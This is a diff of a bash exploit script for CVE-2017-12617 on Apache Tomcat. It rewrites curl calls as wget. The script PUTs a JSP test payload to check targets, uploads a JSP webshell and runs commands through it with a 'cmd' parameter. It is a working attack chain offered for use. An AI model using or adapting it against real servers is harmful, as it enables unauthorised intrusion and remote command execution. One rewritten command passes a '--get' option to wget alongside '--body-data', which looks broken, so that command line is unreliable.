@@ -1,6 +1,7 @@
 #!/bin/bash
 
 # Colors
+#teste
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
@@ -35,10 +36,10 @@ check_vuln() {
     echo -e "${GREEN}[+] Checking ${url}${NC}"
     
     # Create test payload
-    curl -s -X PUT -d '<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>' -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" "${url}/${file}" > /dev/null
+    wget -q --post-data='<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>' --header="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" --method=PUT "${url}/${file}" -O /dev/null
     
     # Check response
-    response=$(curl -s -X GET -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" "${url}/${file}")
+    response=$(wget -q -O - --header="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" "${url}/${file}")
     if [[ $response == *"AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"* ]]; then
         echo -e "${YELLOW}${url} is vulnerable to CVE-2017-12617${NC}"
         echo -e "${YELLOW}${url}/${file}${NC}"
@@ -72,7 +73,7 @@ create_webshell() {
 <pre><%=output %></pre>"
     
     echo -e "${GREEN}[+] Uploading webshell...${NC}"
-    curl -s -X PUT -d "$evil" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" "${url}/${file}" > /dev/null
+    wget -q --post-data="$evil" --header="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" --method=PUT "${url}/${file}" -O /dev/null
     echo -e "${GREEN}[+] Webshell uploaded!${NC}"
 }
 
@@ -81,7 +82,7 @@ get_output() {
     local url=$1
     local file=$2
     local cmd=$3
-    local output=$(curl -s -X GET -G -d "cmd=${cmd}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" "${url}/${file}")
+    local output=$(wget -q -O - --header="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" --get --body-data="cmd=${cmd}" "${url}/${file}")
     echo -e "$(removetags "$output")"
 }
 
